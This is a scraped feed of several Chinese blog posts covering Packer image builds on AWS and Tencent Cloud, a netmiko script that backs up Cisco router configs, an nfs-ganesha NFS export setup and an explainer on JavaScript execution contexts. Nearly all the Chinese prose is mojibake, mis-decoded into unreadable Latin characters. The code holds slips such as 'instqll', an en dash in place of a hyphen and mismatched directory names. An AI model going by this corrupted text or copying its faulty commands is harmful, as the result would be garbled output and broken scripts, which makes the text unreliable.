æ¥ç”»çš„ã€‚\né‚£ä¹ˆ Infrastructure as Code ï¼ˆIACï¼‰ å¯ä»¥åˆ†ä¸ºä»¥ä¸‹äº”ä¸ªéƒ¨åˆ†ï¼š\nAd hoc scripts Configuration Management tools Orchestration tools Provisioning tools Server Templating tools ä¸€ã€Ad hoc scripts å°±æ˜¯ç”¨è½¯ä»¶å¯¹ç›®çš„ä¸»æœºè¿›è¡Œ point to point æ“ä½œï¼Œç”¨shellæˆ–è€…ansibleéƒ½å¯ä»¥ã€‚æ¨èansibleã€‚\nåœ¨ infosys é¢è¯•è¢«ä¸€ä¸ªå°åº¦è€å¤–é—®åˆ°è¿™é—®é¢˜ï¼Œå› ä¸ºå¹³æ—¶æ ¹æœ¬ä¸ç”¨ansible çš„ ad hoc ç‚¹å¯¹ç‚¹æ¨¡å¼ï¼Œç»“æœè¢«å½“åœºé—®ä½ã€‚ç°åœ¨æ‰çŸ¥é“è¿™ç©æ„æ˜¯ä»€ä¹ˆã€‚å½“ç„¶ï¼Œç”¨ ansible çš„è¯ä¸å»ºè®®ç”¨è¿™ä¸ªï¼Œå› ä¸º playbook æ˜¯å¯è¿½æº¯çš„ã€‚\näºŒã€Configuration Management tools é…ç½®ç®¡ç†ï¼Œè¿™é‡Œå½“ç„¶æ¨è ansibleï¼Œæ¯ä¸€æ­¥çš„æ“ä½œéƒ½å¯ä»¥æœ‰ inventory å’Œ playbook å¯ä»¥è¿½æº¯ã€‚\nä¸‰ã€Orchestration tools ååŒå·¥å…·ï¼Œk8så’Œkvm\nå››ã€Provisioning tools ç”Ÿäº§å·¥å…·ï¼Œå½“ç„¶æ˜¯terraformï¼Œå¦å¤–ï¼Œé˜¿é‡Œäº‘æ˜¯æ”¯æŒplumiçš„ï¼Œåä¸ºè…¾è®¯ä¸æ”¯æŒã€‚\näº”ã€Server Templating tools æ¨¡æ¿å·¥å…·ï¼Œè¿™é‡Œå°±æ˜¯ Packerï¼Œå…¶å®æˆ‘ä»¬å…¬å¸ç°åœ¨çš„æ¨¡æ¿å·¥å…·ï¼Œæ˜¯å…«æˆ’ä»openstackå­¦çš„ï¼Œæ”¹åŠ¨Cloud-initçš„ä¸œè¥¿ã€‚\nPackeræ›´æ ‡å‡†ä¸€ä¸‹ï¼Œæ˜¯è¿›åŒ–ç‰ˆçš„ä¸œè¥¿ï¼Œå®ƒæ—¢å¯ä»¥æ‰“kvmé•œåƒï¼Œä¹Ÿå¯ä»¥æ‰“Dockeré•œåƒã€‚\nä¸‹é¢æˆ‘ä»¬å°±çœ‹çœ‹æ€ä¹ˆä½¿ç”¨å§ï¼Œè¿™é‡Œå…ˆè¯´kvmï¼Œå› ä¸ºkvmçš„æ¯”è¾ƒéš¾ï¼Œdockerçš„å…«æˆ’ç°åœ¨è¿˜æ˜¯ç”¨Dockerfileï¼Œæœ‰ç©ºäº†å†ç ”ç©¶packerï¼š\nå®‰è£…å°±ä¸å¤šè¯´äº†ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥å°±è¡Œï¼Œä¸ç”¨è£…ã€‚\nPackerçš„æ ¸å¿ƒæ˜¯ä¸‰ä¸ªéƒ¨åˆ†\nbuilders provisioners post-processors æˆ‘ä»¬å…ˆå»ºç«‹ä¸€ä¸ªç©ºç›®å½•ï¼Œåå­—éšä¾¿ï¼Œå°±å« test-image\n1mkdir test-images 2cd test-image ç„¶ååœ¨ç›®å½•ä¸‹é¢ï¼Œå»ºç«‹ä¸‰ä¸ªæ–‡ä»¶ï¼š\npacker.json, variable.json, setup.sh\né¦–å…ˆçœ‹variable.jsonï¼Œå¯¹åº”AWSé•¿è¿™æ ·\n1{ 2 \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, 3 \u0026#34;access_key\u0026#34;: \u0026#34;enter-aws-your-key\u0026#34;, 4 \u0026#34;secret_key\u0026#34;: \u0026#34;enter-aws-your-secret\u0026#34; 5 \u0026#34;source_ami\u0026#34;: \u0026#34;enter-yours\u0026#34; 6 } å¯¹åº”è…¾è®¯äº‘å°±æ˜¯è¿™æ ·\n1{ 2 \u0026#34;description\u0026#34;: \u0026#34;test image\u0026#34;, 3 \u0026#34;tc_secret_id\u0026#34;: \u0026#34;TENCENTCLOUD_ACCESS_KEY\u0026#34;, 4 \u0026#34;tc_secret_key\u0026#34;: \u0026#34;TENCENTCLOUD_SECRET_KEY\u0026#34;, 5 \u0026#34;source_tc\u0026#34;: \u0026#34;enter-yours\u0026#34; 6} ç¨å¾®è§£é‡Šä¸€ä¸‹ï¼Œæ— è®ºå“ªå®¶äº‘ï¼Œä½ éƒ½éœ€è¦å»ç”³è¯·secretçš„keyï¼Œæ‰å¯ä»¥ç”¨ï¼Œç„¶åå°±æ˜¯source_amiå’Œsource_tcäº†ï¼Œè¿™ä¸ªæŒ‡é•œåƒçš„æ¯ç‰ˆ\nawsçš„é•¿è¿™æ ·ï¼š\nè…¾è®¯çš„é•¿è¿™æ ·ï¼š\nokï¼Œå˜é‡éƒ½å®šä¹‰å¥½äº†ã€‚\nä¸‹é¢æ˜¯packer.jsonçš„æ­£æ–‡\nawsçš„è¿™æ ·ï¼š\n1{ 2\t\u0026#34;builders\u0026#34;: [ 3 { 4 \u0026#34;type\u0026#34;: \u0026#34;amazon-ebs\u0026#34;, 5 \u0026#34;access_key\u0026#34;: \u0026#34;{{user `access_key` }}\u0026#34;, 6 \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `secret_key` }}\u0026#34;, 7 \u0026#34;region\u0026#34; : \u0026#34;us-east-1\u0026#34;, 8 \u0026#34;ami_name\u0026#34; : \u0026#34;myfirstami\u0026#34;, 9 \u0026#34;source_ami\u0026#34; : \u0026#34;{{user `source_ami` }}\u0026#34;, 10 \u0026#34;instance_type\u0026#34; : \u0026#34;t2.micro\u0026#34;, 11 \u0026#34;ssh_username\u0026#34; : \u0026#34;ec2-user\u0026#34; 12 } 13 ], 14 \u0026#34;provisioners\u0026#34;: [ 15 { 16 \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, 17 \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; 18 } 19 ], 20\t\u0026#34;post-processors\u0026#34;: [ 21 { 22 \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, 23 \u0026#34;output\u0026#34;: \u0026#34;out.json\u0026#34; 24 } 25 ] 26} çœ‹è§äº†å§ï¼Œæ ¸å¿ƒä¸‰éƒ¨åˆ†ã€‚é‚£ä¹ˆæ¢æˆè…¾è®¯ï¼Œå°±é•¿è¿™æ ·\n1{ 2 \u0026#34;builders\u0026#34;: [ 3 { 4 \u0026#34;type\u0026#34;: \u0026#34;tencentcloud-cvm\u0026#34;, 5 \u0026#34;secret_id\u0026#34;: \u0026#34;{{user `tc_secret_id`}}\u0026#34;, 6 \u0026#34;secret_key\u0026#34;: \u0026#34;{{user `tc_secret_key`}}\u0026#34;, 7 \u0026#34;region\u0026#34;: \u0026#34;ap-guangzhou\u0026#34;, 8 \u0026#34;zone\u0026#34;: \u0026#34;ap-guangzhou-3\u0026#34;, 9 \u0026#34;instance_type\u0026#34;: \u0026#34;S2.SMALL1\u0026#34;, 10 \u0026#34;disk_type\u0026#34;: \u0026#34;CLOUD_PREMIUM\u0026#34;, 11 \u0026#34;associate_public_ip_address\u0026#34;: true, 12 \u0026#34;image_name\u0026#34;: \u0026#34;myfirsttc\u0026#34;, 13 \u0026#34;source_image_id\u0026#34;: \u0026#34;{{user `source_tc` }}\u0026#34;, 14 \u0026#34;ssh_username\u0026#34; : \u0026#34;root\u0026#34; 15 } 16 ], 17 \u0026#34;provisioners\u0026#34;: [ 18 { 19 \u0026#34;type\u0026#34;: \u0026#34;shell\u0026#34;, 20 \u0026#34;script\u0026#34;: \u0026#34;setup.sh\u0026#34; 21 } 22 ], 23\t\u0026#34;post-processors\u0026#34;: [ 24 { 25 \u0026#34;type\u0026#34;: \u0026#34;manifest\u0026#34;, 26 \u0026#34;output\u0026#34;: \u0026#34;out.json\u0026#34; 27 } 28 ] 29} å¤§å·®ä¸å·®å§ã€‚\nè¯¦ç»†å‚æ•°å¯ä»¥å»çœ‹ï¼šhttps://www.packer.io/plugins/builders/tencentcloud\né‚£æœ€åå°±æ˜¯setup.shäº†ï¼Œä¸¾ä¾‹è£…ä¸ªjenkinså¥½äº†ï¼Œå…¶ä»–çš„å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œæ³¨å…¥ï¼š\n1sleep 30 2sudo yum update â€“y 3sudo wget -O /etc/yum.repos.d/jenkins.repo \\ 4 https://pkg.jenkins.io/redhat-stable/jenkins.repo 5sudo rpm --import https://pkg.jenkins.io/redhat-stable/jenkins.io.key 6sudo yum upgrade 7sudo yum instqll -y epel-release 8sudo yum install java-openjdk11 -y 9sudo yum install jenkins -y 10sudo systemctl enable jenkins 11sudo systemctl start jenkins 12sudo systemctl status jenkins æœ€årunä¸€ä¸‹ï¼š\n1packer build -var-file=\u0026#34;variable.json\u0026#34; packer.json å½å“©å’•å™œä¸€é¡¿ï¼Œå°±buildå¥½äº†\nOverï¼Œè¿™ä¸ªå·¥å…·åœ¨IASä¸­æ˜¯ä¸å¯ç¼ºå°‘çš„ä¸€ç¯ã€‚\n","date":"2022-07-17","img":"","permalink":"https://rendoumi.com/posts/20220717-terraform/","series":null,"tags":null,"title":"Infrastructure as Codeä¸­packerçš„ä½¿ç”¨"},{"categories":null,"content":"åœ¨æ—¥å¸¸å·¥ä½œä¸­æˆ‘ä»¬ç»å¸¸è¦å¯¹ Cisco çš„ç½‘ç»œè®¾å¤‡çš„é…ç½®è¿›è¡Œå¤‡ä»½ï¼Œæˆ–è€…å’Œ suricata è”åŠ¨çš„æ—¶å€™è¦æ‰§è¡Œæ“ä½œã€‚\næ–¹æ³•å…¶å®å¾ˆç®€å•ï¼Œè°ƒç”¨ python çš„ç›¸åº”æ¨¡å—å³å¯ã€‚\nå‡†å¤‡å·¥ä½œå¦‚ä¸‹ï¼š\né¦–é€‰éœ€è¦åœ¨/export/servers/python363è£…å¥½ python 3.6, pip install netmiko\nå…¶æ¬¡ï¼Œåœ¨è·¯ç”±å™¨ä¸Šå¯ä»¥é…ç½®ençš„å¯†ç \nç„¶åä¾æ¬¡æ‰§è¡Œå¤‡ä»½å°±å¯ä»¥äº†ã€‚\n1#!/export/servers/python363/bin/python3.6 2from netmiko import Netmiko 3import time 4tw_bgp = { 5 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 6 \u0026#34;host\u0026#34;: \u0026#34;tw-bgp\u0026#34;, 7 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.10\u0026#34;, 8 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 9 \u0026#34;use_keys\u0026#34;: True, 10 \u0026#34;secret\u0026#34; : \u0026#34;xxxxxxxx\u0026#34;, 11 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 12} 13tw_r1_e1 = { 14 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 15 \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e1\u0026#34;, 16 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.11\u0026#34;, 17 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 18 \u0026#34;use_keys\u0026#34;: True, 19 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 20} 21tw_r1_e2 = { 22 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 23 \u0026#34;host\u0026#34;: \u0026#34;tw-r1-e2\u0026#34;, 24 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.12\u0026#34;, 25 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 26 \u0026#34;use_keys\u0026#34;: True, 27 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 28} 29tw_r2_e1 = { 30 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 31 \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e1\u0026#34;, 32 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.13\u0026#34;, 33 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 34 \u0026#34;use_keys\u0026#34;: True, 35 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 36} 37tw_r2_e2 = { 38 \u0026#34;device_type\u0026#34;: \u0026#34;cisco_ios\u0026#34;, 39 \u0026#34;host\u0026#34;: \u0026#34;tw-r2-e2\u0026#34;, 40 \u0026#34;ip\u0026#34;: \u0026#34;192.168.1.14\u0026#34;, 41 \u0026#34;username\u0026#34;: \u0026#34;noc\u0026#34;, 42 \u0026#34;use_keys\u0026#34;: True, 43 \u0026#34;key_file\u0026#34;: \u0026#34;/root/.ssh/id_jump_rsa_new\u0026#34;, 44} 45 46devices=[tw_bgp, tw_r1_e1, tw_r1_e2, tw_r2_e1, tw_r2_e2] 47 48for dev in devices: 49 name = dev[\u0026#34;ip\u0026#34;] 50 connection = Netmiko(**dev) 51 connection.enable() 52 out = connection.send_command(\u0026#34;show running-config\u0026#34;) 53 calender = time.strftime(\u0026#34;%Y%m%d\u0026#34;) 54 file_name = \u0026#39;{}-{}.txt\u0026#39;.format(dev[\u0026#34;host\u0026#34;],calender) 55 file = open(file_name ,\u0026#34;w\u0026#34;) 56 file.write(out) 57 file.close() 58 connection.disconnect() 59 print(\u0026#34;BACKUP for %s done\u0026#34; %dev[\u0026#34;host\u0026#34;]) ","date":"2022-07-17","img":"","permalink":"https://rendoumi.com/posts/20220717-backup_cisco/","series":null,"tags":null,"title":"Ciscoè®¾å¤‡è‡ªåŠ¨æ‰§è¡Œå’Œå¤‡ä»½çš„è„šæœ¬"},{"categories":null,"content":"NFS Server å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯å‘ä¹Ÿæ˜¯å·¨å¤§çš„ã€‚ä¹‹å‰åœ¨äº¬ä¸œè¿ç»´ Hadoop é›†ç¾¤çš„æ—¶å€™ç¢°åˆ°è¿‡è„‘è£‚ï¼ŒåŸå› å°±æ˜¯ NFS å¼•èµ·çš„ã€‚\nå…³é”® NFS æ˜¯å†…æ ¸æ€çš„ï¼Œä¸€æ—¦å´©æºƒï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯çš„æ‰€æœ‰å‘½ä»¤ï¼Œlsã€dfã€duç­‰ç­‰ï¼Œç»Ÿç»Ÿæ— ååº”ï¼Œç»“æœæ˜¯å¾ˆæ‚²å‰§çš„ã€‚\nä¸‹é¢è¦æ¨èä¸€ä¸‹ nfs-ganesha ï¼Œå®ƒæ˜¯ç”¨æˆ·æ€çš„nfs-serverï¼Œæ”¯æŒv3å’Œv4ï¼Œè€Œnfsç¼ºçœæ˜¯å†…æ ¸æ€çš„v3ã€‚\nå¼ºçƒˆæ¨èå¤§å®¶ç”¨è¿™ä¸ªï¼Œè€Œä¸æ˜¯ç”¨å†…æ ¸æ€çš„ï¼Œå¹¶ä¸” nfs-ganesha è¿˜æ˜¯æ”¯æŒ glusterFS çš„ã€‚\n1yum install -y centos-release-nfs-ganesha30.noarch 2 3vi /etc/ganesha/ganesha.conf 4%include /etc/ganesha/exports/gv0.conf 5 6vi /etc/ganesha/exports/gv0.conf 7EXPORT{ 8 Export_Id = 1 ; # Export ID unique to each export 9 Path = \u0026#34;/mnt/upload\u0026#34;; 10 Pseudo = /upload; 11 FSAL { 12 name = VFS; 13 } 14 Access_type = RW; # Access permissions 15 Squash = No_root_squash; # To enable/disable root squashing 16 Disable_ACL = TRUE; # To enable/disable ACL 17 Protocols = \u0026#34;4\u0026#34; ; # NFS protocols supported 18 Transports = \u0026#34;UDP\u0026#34;,\u0026#34;TCP\u0026#34; ; # Transport protocols supported 19 SecType = \u0026#34;sys\u0026#34;; # Security flavors supported 20} 21 22#å¯åŠ¨ 23systemctl restart nfs-ganesha 24 25#æ‰‹åŠ¨mountçš„æ–¹æ³• 26mount -t nfs -o soft,intr,rsize=8192,wsize=8192,timeo=900,proto=tcp,vers=4 192.168.31.2:/upload /mnt/nfs-upload 27 28#è‡ªåŠ¨mountçš„æ–¹æ³• 29cat /etc/fstab 30192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers=4,addr=192.168.31.2,clientaddr=192.168.31.8 0 0 æ³¨æ„idå¯¹é½é—®é¢˜å¯èƒ½è¦ç”¨åˆ°rpcidmapd\n","date":"2022-07-06","img":"","permalink":"https://rendoumi.com/posts/20220706-nfs_usermode/","series":null,"tags":null,"title":"ç”¨æˆ·æ€çš„NFS Server"},{"categories":null,"content":"JavaScript åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ ä¸€ã€å·¥ä½œåŸç† JavaScriptåˆ°åº•æ˜¯ï¼š\nåŒæ­¥è¿˜æ˜¯å¼‚æ­¥ï¼Ÿ å•çº¿ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Ÿ JavaScript ä¸­çš„ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨\nExecution Context ï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ä¸­\næ‚¨å¯ä»¥å‡è®¾è¿™ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ æ˜¯ä¸€ä¸ªå¤§ç›’å­æˆ–ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œæ•´ä¸ª JavaScript ä»£ç ã€‚ è¿™ä¸ªå¤§ç›’å­é‡Œæœ‰ä¸¤ä¸ªç»„ä»¶ï¼š Memoryï¼ˆå†…å­˜ç»„ä»¶ï¼‰ï¼šè¿™æ˜¯æ‰€æœ‰å˜é‡å’Œå‡½æ•°å­˜å‚¨ä¸ºé”®å€¼å¯¹çš„åœ°æ–¹ã€‚è¿™ä¸ª**â€œå†…å­˜ç»„ä»¶â€ä¹Ÿç§°ä¸ºå˜é‡ç¯å¢ƒ**ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ç§ç¯å¢ƒï¼Œå…¶ä¸­æ‰€æœ‰è¿™äº›å˜é‡å’Œå‡½æ•°éƒ½å­˜å‚¨ä¸ºé”®å€¼å¯¹ã€‚ Codeï¼ˆä»£ç ç»„ä»¶ï¼‰ï¼šè¿™æ˜¯ä»£ç é€è¡Œæ‰§è¡Œçš„åœ°æ–¹ã€‚è¿™ä¸ªâ€œä»£ç ç»„ä»¶â€ä¹Ÿç§°ä¸ºæ‰§è¡Œçº¿ç¨‹ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªæ‰§è¡Œçº¿ç¨‹æ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼Œæ•´ä¸ªä»£ç ä¸€æ¬¡åªæ‰§è¡Œä¸€è¡Œã€‚ ç»“è®ºï¼šJavaScript æ˜¯ä¸€ç§åŒæ­¥å•çº¿ç¨‹è¯­è¨€ã€‚\nå•çº¿ç¨‹ æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚ åŒæ­¥å•çº¿ç¨‹ æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½ä»¥ç‰¹å®šé¡ºåºæ¯æ¬¡æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚è¿™æ„å‘³ç€å®ƒåªèƒ½åœ¨å½“å‰è¡Œå®Œæˆæ‰§è¡Œåè½¬åˆ°ä¸‹ä¸€è¡Œã€‚è¿™å°±æ˜¯åŒæ­¥å•çº¿ç¨‹çš„æ„æ€ã€‚ å¾ˆæƒŠè¯§å§ï¼Œå®é™… javascripts æœ‰å•çº¿ç¨‹ event loop å¤§å¾ªç¯æ¥å®Œæˆå¾ˆå¤šä¸å¯æ€è®®çš„äº‹æƒ…ã€‚\näºŒã€å®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ JavaScript ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Ÿ å½“ä½ è¿è¡Œ JavaScript ä»£ç æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\nä¼šåˆ›å»ºä¸€ä¸ªExecution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ã€‚\nè®©æˆ‘ä»¬ä½¿ç”¨å®é™…çš„ä»£ç æ¥ä¸¾ä¸ªä¾‹å­ï¼š\n1var n = 2; 2function square(num) { 3 var ans = num * num; 4 return ans; 5} 6var square2 = square(n); 7var square4 = square(4); æ‰§è¡Œä¸Šè¿°ä»£ç æ—¶ï¼Œä¼šåˆ›å»º ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡\næ­¤æ‰§è¡Œä¸Šä¸‹æ–‡åˆ†ä¸¤ä¸ªé˜¶æ®µåˆ›å»ºï¼š\nä¸€ã€åˆ›å»ºï¼š\nåˆ›å»ºé˜¶æ®µä¹Ÿç§°ä¸ºå†…å­˜åˆ›å»ºé˜¶æ®µ\nã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„é˜¶æ®µã€‚\nåœ¨å†…å­˜åˆ›å»ºçš„ç¬¬ä¸€é˜¶æ®µï¼ŒJavaScript ä¼šä¸ºæ‰€æœ‰çš„å˜é‡å’Œå‡½æ•°åˆ†é…å†…å­˜ã€‚\né¦–å…ˆ JavaScript é‡åˆ°var n = 2;ï¼Œå®ƒå°±ä¼šåˆ†é…å†…å­˜ç»™n.\nå½“ä¸ºnåˆ†é…å†…å­˜æ—¶ï¼Œå®ƒä¼šå…ˆå­˜å‚¨ä¸€ä¸ªç‰¹æ®Šå€¼undefinedã€‚undefinedåœ¨ JavaScript ä¸­è¢«è§†ä¸ºç‰¹æ®Šçš„å ä½ç¬¦ã€‚\nåœ¨é‡åˆ° functionsquare(num)æ—¶ï¼Œå®ƒä¹Ÿä¼šä¸ºè¿™ä¸ª function () åˆ†é…å†…å­˜ã€‚\nåœ¨ä¸º function() åˆ†é…å†…å­˜çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†è¯¥å‡½æ•°çš„æ•´ä¸ªä»£ç å­˜å‚¨åœ¨å†…å­˜ç©ºé—´ä¸­ã€‚\nåé¢ä¸ºä¸¤ä¸ªå˜é‡square2å’Œsquare4åˆ†é…äº†å†…å­˜ï¼Œå­˜å‚¨çš„åŒæ ·æ˜¯undefinedã€‚\nä¸ºäº†å®Œæˆè¿™ä¸ªåˆ›å»ºé˜¶æ®µï¼ŒJavaScript ä¼šé€è¡Œä»ä¸Šåˆ°ä¸‹éå†æ‰«æä»£ç ã€‚\näºŒã€ä»£ç æ‰§è¡Œï¼š\næ‰«æå®Œæ¯•ï¼Œç°åœ¨ JavaScript å†æ¬¡é€è¡Œè¿è¡Œæ•´ä¸ªç¨‹åºã€‚ å½“å®ƒé‡åˆ°æ—¶var n = 2;ï¼Œå®ƒå®é™…ä¸Šå°†2ä½œä¸ºå€¼næ”¾å…¥å†…å­˜ç»„ä»¶ä¸­ã€‚ å½“å®ƒé‡åˆ° çš„å‡½æ•°å®šä¹‰æ—¶square(num)ï¼Œå®ƒæ²¡æœ‰ä»€ä¹ˆå¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ JavaScript ç®€å•åœ°è·³è¿‡äº†ã€‚ å½“å®ƒé‡åˆ° æ—¶var square2 = square(n);ï¼Œæˆ‘ä»¬ç°åœ¨æ­£åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚ å‡½æ•°æ˜¯ JavaScript çš„æ ¸å¿ƒã€‚å®ƒä»¬åœ¨ JavaScript ä¸­çš„è¡Œä¸ºä¸åœ¨ä»»ä½•å…¶ä»–è¯­è¨€ä¸­çš„è¡Œä¸ºéå¸¸ä¸åŒã€‚ æ¯å½“è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªå…¨æ–°çš„Execution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ã€‚ å› æ­¤ï¼Œä»æŠ€æœ¯ä¸Šè®²ï¼Œåœ¨æ•´ä¸ª**Execution Context çš„ä»£ç ç»„ä»¶ä¸­åˆåˆ›å»ºäº†ä¸€ä¸ªå…¨æ–°çš„Execution Context ** ã€‚ è¿™ä¸ªæ–°çš„å†…éƒ¨ Exection Context æ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿæœ‰å®ƒè‡ªå·±çš„å†…å­˜ç»„ä»¶å’Œä»£ç ç»„ä»¶ã€‚ ç°åœ¨åœ¨å†…éƒ¨å‘ç”Ÿçš„äº‹æƒ…æ˜¯ï¼š åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ 2 ä¸ªå˜é‡ï¼Œå³numï¼ˆå‚æ•°ï¼‰å’Œansã€‚ æ‰€ä»¥å†…å­˜å°†åˆ†é…ç»™numå’Œansã€‚ åœ¨ç¬¬ 1 é˜¶æ®µï¼Œä¸å¤–éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸€æ ·ï¼Œundefinedå°†åˆ†é…ç»™numå’Œansã€‚ ç°åœ¨è¿›å…¥é˜¶æ®µ 2ï¼ˆä»£ç æ‰§è¡Œé˜¶æ®µï¼‰ï¼Œå‚æ•°çš„å€¼è¢«åˆ†é…ç»™å‚æ•°ã€‚å› æ­¤ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨å‡½æ•°çš„è¯­å¥var square2 = square(n);æ—¶ï¼Œæˆ‘ä»¬å°†å‚æ•°nçš„å€¼ 2 ä¼ é€’ç»™å‡½æ•°square(num)ï¼Œå¹¶ä¸”è¯¥å‚æ•°çš„å€¼æ›¿æ¢äº†å†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­numçš„å†…å­˜ç»„ä»¶ä¸­çš„å ä½ç¬¦undefinedã€‚ è®¡ç®—ånum * numï¼Œå°†å€¼å­˜å‚¨åœ¨ ä¸­ansã€‚ åœ¨é‡åˆ° æ—¶return ans;ï¼Œå°†å­˜å‚¨çš„å€¼ansè¿”å›åˆ°è°ƒç”¨çš„ä½ç½®ï¼Œå¹¶ä¸”æ­¤å†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ç»“æŸã€‚å½“å®ƒç»“æŸæ—¶ï¼Œå†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡å®é™…ä¸Šè¢«åˆ é™¤äº†ã€‚ ç°åœ¨ï¼Œé‡åˆ°ä¸‹ä¸€è¡Œæ—¶éµå¾ªç›¸åŒçš„è¿‡ç¨‹var square4 = square(4);ã€‚ æœ€åä¸€è¡ŒæˆåŠŸæ‰§è¡Œåï¼Œæ•´ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿè¢«åˆ é™¤ã€‚è¿™ç§*â€œæ•´ä½“â€*æ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿç§°ä¸ºå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ é‚£ä¹ˆï¼ŒJavaScript æ˜¯å¦‚ä½•ç®¡ç†è¿™ç§é“¾æ¡å¼çš„ ** æ‰§è¡Œä¸Šä¸‹æ–‡ ** çš„å‘¢ï¼Ÿ\nå®ƒå®é™…ä¸Šåœ¨åå°ç®¡ç†ä¸€ä¸ªå †æ ˆã€‚ æ­¤å †æ ˆä¹Ÿç§°ä¸ºCall Stackï¼ˆè°ƒç”¨å †æ ˆï¼‰ã€‚ GECï¼ˆGlobal Execution Context å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰å§‹ç»ˆä½äºæ­¤å †æ ˆçš„åº•éƒ¨ã€‚ æ¯å½“åˆ›å»ºä¸€ä¸ªæ–°çš„æ‰§è¡Œä¸Šä¸‹æ–‡æ—¶ï¼Œå®ƒå°±ä¼šè¢«å‹å…¥è¿™ä¸ªå †æ ˆï¼Œå¹¶åœ¨å®Œæˆå…¶ç›®çš„æ—¶è¢«å¼¹å‡ºã€‚ æ§ä»¶ä¸æ­¤è°ƒç”¨å †æ ˆçš„æœ€é¡¶éƒ¨å…ƒç´ ä¿æŒä¸€è‡´ã€‚ æ­¤è°ƒç”¨å †æ ˆä»…ç”¨äºç®¡ç†æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ åœ¨æˆåŠŸæ‰§è¡Œæœ€åä¸€æ¡è¯­å¥æ—¶ï¼Œè°ƒç”¨å †æ ˆè¢«æ¸…ç©ºã€‚ è°ƒç”¨å †æ ˆç»´æŠ¤æ‰§è¡Œä¸Šä¸‹æ–‡çš„*æ‰§è¡Œé¡ºåºã€‚*\nç»™ä¸ªå›¾æ›´å¥½ç†è§£ï¼š\nè°ƒç”¨å †æ ˆå…·æœ‰ä»¥ä¸‹èŠ±å“¨çš„åç§°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¿™äº›åç§°æ¥å¼•ç”¨å®ƒï¼š\nExecution Context Stackï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡å †æ ˆï¼‰ Program Stackï¼ˆç¨‹åºæ ˆï¼‰ Control Stackï¼ˆæ§åˆ¶å †æ ˆï¼‰ Runtime Stackï¼ˆè¿è¡Œæ—¶å †æ ˆï¼‰ Machine Stackï¼ˆæœºå™¨å †æ ˆï¼‰ è¿™æ ·å¤§å®¶å°±ç†è§£äº†å§ï¼Œè¿™æ ·åé¢çš„å˜é‡æå‡ Hoisting 